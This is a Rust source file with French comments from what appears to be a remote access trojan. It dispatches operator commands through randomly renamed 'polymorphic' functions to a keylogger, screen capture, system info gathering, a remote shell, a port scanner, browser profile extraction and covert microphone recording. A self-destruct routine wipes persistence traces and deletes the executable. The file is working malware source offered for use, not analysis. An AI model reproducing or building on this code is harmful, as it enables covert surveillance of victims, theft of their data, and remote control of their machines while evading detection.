use crate::{browser_info, connexion, input, logs, mic_rec, network_scanner, screenshot, shell};
use rand::Rng;
use std::sync::atomic::Ordering;
use std::{collections::HashMap, future::Future, pin::Pin, sync::OnceLock};

type PolyFunc = Box<dyn Fn(String) -> Pin<Box<dyn Future<Output = ()> + Send>> + Send + Sync>;

static FUNCTION_MAP: OnceLock<HashMap<String, PolyFunc>> = OnceLock::new();
static COMMAND_MAP: OnceLock<HashMap<&'static str, String>> = OnceLock::new();

pub fn generate_fn_name() -> String {
    const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let mut rng = rand::rng();
    (0..16)
        .map(|_| {
            let idx = rng.random_range(0..CHARSET.len());
            CHARSET[idx] as char
        })
        .collect()
}

pub fn init_polymorph_functions() {
    let mut poly_map = HashMap::new();
    let mut cmd_map = HashMap::new();

    // Génération des noms polymorphiques
    let keylogger_name = generate_fn_name();
    let screenshot_name = generate_fn_name();
    let logs_name = generate_fn_name();
    let shell_name = generate_fn_name();
    let network_scan_name = generate_fn_name();
    let browser_info_name = generate_fn_name();
    let mic_rec_name = generate_fn_name();
    let end_of_rat_name = generate_fn_name();

    cmd_map.insert("keylogger", keylogger_name.clone());
    cmd_map.insert("screenshot", screenshot_name.clone());
    cmd_map.insert("logs", logs_name.clone());
    cmd_map.insert("shell", shell_name.clone());
    cmd_map.insert("network_scan", network_scan_name.clone());
    cmd_map.insert("browser_info", browser_info_name.clone());
    cmd_map.insert("mic_rec", mic_rec_name.clone());
    cmd_map.insert("end_of_rat", end_of_rat_name.clone());

    poly_map.insert(
        keylogger_name.clone(),
        Box::new(|alias| {
            Box::pin(keylogger_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>
        }) as PolyFunc,
    );
    poly_map.insert(
        screenshot_name.clone(),
        Box::new(|alias| {
            Box::pin(screenshot_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>
        }) as PolyFunc,
    );
    poly_map.insert(
        logs_name.clone(),
        Box::new(|alias| Box::pin(logs_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>)
            as PolyFunc,
    );
    poly_map.insert(
        shell_name.clone(),
        Box::new(|alias| Box::pin(shell_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>)
            as PolyFunc,
    );
    poly_map.insert(
        network_scan_name.clone(),
        Box::new(|alias| {
            Box::pin(network_scan_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>
        }) as PolyFunc,
    );
    poly_map.insert(
        browser_info_name.clone(),
        Box::new(|alias| {
            Box::pin(browser_info_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>
        }) as PolyFunc,
    );
    poly_map.insert(
        mic_rec_name.clone(),
        Box::new(|alias| {
            Box::pin(mic_rec_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>
        }) as PolyFunc,
    );
    poly_map.insert(
        end_of_rat_name.clone(),
        Box::new(|alias| {
            Box::pin(end_of_rat_wrapper(alias)) as Pin<Box<dyn Future<Output = ()> + Send>>
        }) as PolyFunc,
    );

    println!("Noms polymorphiques générés :");
    println!("- keylogger: {}", keylogger_name);
    println!("- screenshot: {}", screenshot_name);
    println!("- logs: {}", logs_name);
    println!("- shell: {}", shell_name);
    println!("- network_scan: {}", network_scan_name);
    println!("- browser_info: {}", browser_info_name);
    println!("- mic_rec: {}", mic_rec_name);
    println!("- end_of_rat: {}", end_of_rat_name);

    let _ = FUNCTION_MAP.set(poly_map);
    let _ = COMMAND_MAP.set(cmd_map);
}

async fn keylogger_wrapper(alias: String) {
    println!("[{}] Démarrage du keylogger...", alias);

    if let Err(e) = input::start_keylogger(10).await {
        let _ = connexion::send_directive_status("keylogger", "error", &e.to_string()).await;
    }
}

async fn screenshot_wrapper(alias: String) {
    println!("[{}] Prise de screenshot...", alias);
    match screenshot::take_screenshot().await {
        Ok(_) => {
            let _ = connexion::send_directive_status("screenshot", "success", "Terminé").await;
        }
        Err(e) => {
            let _ = connexion::send_directive_status("screenshot", "error", &e.to_string()).await;
        }
    }
}

async fn logs_wrapper(alias: String) {
    println!("[{}] Récupération des logs système...", alias);
    match logs::get_sysinfo().await {
        Ok(_) => {
            let _ = connexion::send_directive_status("logs", "success", "Terminé").await;
        }
        Err(e) => {
            let _ = connexion::send_directive_status("logs", "error", &e.to_string()).await;
        }
    }
}

async fn shell_wrapper(alias: String) {
    println!("[{}] Démarrage du shell distant...", alias);
    match shell::launch_shell().await {
        Ok(_) => {
            let _ = connexion::send_directive_status("shell", "success", "Session terminée").await;
        }
        Err(e) => {
            let _ = connexion::send_directive_status("shell", "error", &e.to_string()).await;
        }
    }
}

async fn network_scan_wrapper(alias: String) {
    println!("[{}] Scanner réseau...", alias);
    match network_scanner::scan_all_ports().await {
        Ok(_) => {
            let _ = connexion::send_directive_status("network_scan", "success", "Terminé").await;
        }
        Err(e) => {
            let _ = connexion::send_directive_status("network_scan", "error", &e.to_string()).await;
        }
    }
}

async fn browser_info_wrapper(alias: String) {
    println!("[{}] Extraction données navigateurs...", alias);
    match browser_info::process_browser_profiles().await {
        Ok(_) => {
            let _ = connexion::send_directive_status("browser_info", "success", "Terminé").await;
        }
        Err(e) => {
            let _ = connexion::send_directive_status("browser_info", "error", &e.to_string()).await;
        }
    }
}

async fn mic_rec_wrapper(alias: String) {
    let state = mic_rec::init_mic_rec_state();
    let mut guard = state.lock().await;
    match *guard {
        mic_rec::MicRecStatus::Running => {
            println!("[{}] mic_rec déjà en cours", alias);
            return;
        }
        _ => {
            *guard = mic_rec::MicRecStatus::Running;
        }
    }

    println!(
        "[{}] Démarrage de la boucle d'enregistrement micro...",
        alias
    );

    let flag = mic_rec::init_mic_rec_flag();
    flag.store(true, Ordering::SeqCst);

    let state_clone = state.clone();
    tokio::spawn(async move {
        match mic_rec::mic_rec_loop(flag.clone()).await {
            Ok(_) => {
                let _ = connexion::send_directive_status("mic_rec", "success", "Terminé").await;
            }
            Err(e) => {
                let _ = connexion::send_directive_status("mic_rec", "error", &e.to_string()).await;
            }
        }
        let mut guard = state_clone.lock().await;
        *guard = mic_rec::MicRecStatus::Idle;
    });
}

async fn end_of_rat_wrapper(alias: String) {
    println!("[{}] Suppression du programme (end_of_rat)...", alias);
    #[cfg(target_os = "windows")]
    {
        crate::persistance::remove_all_traces();
        use std::process::Command;
        let exe_path = std::env::current_exe().unwrap();
        let _ = Command::new("cmd")
            .args([
                "/C",
                &format!("timeout 1 && del /F /Q \"{}\"", exe_path.display()),
            ])
            .spawn();
    }
    #[cfg(target_os = "linux")]
    {
        crate::persistance::remove_all_traces();
        use std::process::Command;
        let exe_path = std::env::current_exe().unwrap();
        let _ = Command::new("sh")
            .arg("-c")
            .arg(format!("sleep 1 && rm -f '{}'", exe_path.display()))
            .spawn();
    }
    let _ = connexion::send_directive_status("end_of_rat", "success", "Programme supprimé").await;
    std::process::exit(0);
}

pub async fn execute_poly_command(command: &str) {
    let poly_name = match COMMAND_MAP.get() {
        Some(cmd_map) => match cmd_map.get(command) {
            Some(name) => name,
            None => {
                println!("Commande inconnue: {}", command);
                return;
            }
        },
        None => {
            println!("COMMAND_MAP non initialisée");
            return;
        }
    };

    match FUNCTION_MAP.get() {
        Some(func_map) => match func_map.get(poly_name) {
            Some(func) => {
                println!("Exécution de la commande polymorphique: {}", poly_name);
                func(poly_name.clone()).await;
            }
            None => println!("Fonction non trouvée pour: {}", poly_name),
        },
        None => println!("FUNCTION_MAP non initialisée"),
    }
}

pub fn get_command_map() -> Option<&'static HashMap<&'static str, String>> {
    COMMAND_MAP.get()
}
